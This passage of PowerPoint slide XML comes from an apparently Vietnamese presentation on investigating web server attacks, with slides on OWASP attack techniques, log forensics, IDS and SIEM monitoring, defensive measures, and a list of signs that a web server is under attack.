          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="112" name="Google Shape;112;p15" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4352925" y="2081212"/>
            <a:ext cx="3486150" cy="3371850"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="113" name="Google Shape;113;p15" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8124825" y="2081212"/>
            <a:ext cx="3486150" cy="3371850"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114" name="Google Shape;114;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="876300" y="3024187"/>
            <a:ext cx="12660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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Lý Thuyết</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="115" name="Google Shape;115;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="876300" y="3490912"/>
            <a:ext cx="2895600" cy="133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a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Nghiên cứu các kỹ thuật tấn công web phổ biến (OWASP) và phương pháp phân tích chứng cứ số (Log Forensics).</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="116" name="Google Shape;116;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4648200" y="3024187"/>
            <a:ext cx="17487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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Thực Nghiệm</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="117" name="Google Shape;117;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4648200" y="3490912"/>
            <a:ext cx="2895600" cy="133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a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Xây dựng quy trình điều tra và thực nghiệm trên kịch bản giả định trong môi trường máy chủ Apache,  và giám sát bằng IDS, SIEM.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="118" name="Google Shape;118;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="3024187"/>
            <a:ext cx="12459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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Giải Pháp</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="119" name="Google Shape;119;p15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="3490912"/>
            <a:ext cx="2895600" cy="133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a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Đề xuất giải pháp bảo mật, cấu hình ghi nhận sự kiện tập trung và chủ động phòng thủ trước các nguy cơ xâm nhập.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="120" name="Google Shape;120;p15" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId6">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="876300" y="2405062"/>
            <a:ext cx="381000" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="121" name="Google Shape;121;p15" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId7">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4648200" y="2405062"/>
            <a:ext cx="476250" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="122" name="Google Shape;122;p15" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId8">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8420100" y="2405062"/>
            <a:ext cx="381000" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="123" name="Google Shape;123;p15"/>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II. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Mục Tiêu &amp; Phạm Vi Nghiên </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Cứu:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="124" name="Google Shape;124;p15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="1143000"/>
            <a:ext cx="11029950" cy="1905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28"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p16" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="504825" y="1499800"/>
            <a:ext cx="11030100" cy="4962375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="130" name="Google Shape;130;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1231900" y="1729150"/>
            <a:ext cx="88668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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Dấu hiệu của một cuộc tấn công máy chủ Web:</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="131" name="Google Shape;131;p16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1007625" y="2177950"/>
            <a:ext cx="10024500" cy="2001000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Khách</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hàng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không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thể</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truy</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cập</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vào</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bất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kỳ</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dịch</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vụ</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trực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tuyến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nào</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có</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thể</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> do </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>tấn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công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từ</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chối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dịch</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vụ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Các</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> URL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>đúng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bị</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chuyển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hướng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> sang </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>các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trang</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>sai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lệch</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Hiệu</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suất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mạng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chậm</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bất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thường</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Máy</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chủ</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thường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xuyên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bị</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khởi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động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lại</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Xuất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hiện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các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điểm</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bất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thường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trong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tệp</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nhật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ký</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> log</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Times New Roman"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Xuất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hiện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các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thông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báo</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lỗi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như</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lỗi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> 500, “internal server error” (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>lỗi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máy</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chủ</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nội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bộ</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hoặc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> “problem processing your request” (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Vấn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đề</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khi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xử</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lý</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yêu</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cầu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
            <a:endParaRPr sz="1300" dirty="0">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="132" name="Google Shape;132;p16" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="647700" y="1700212"/>
            <a:ext cx="381000" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="133" name="Google Shape;133;p16"/>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75" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>III. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Trả</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>lời</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>câu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3375" b="1" dirty="0" err="1">
                <a:solidFill>
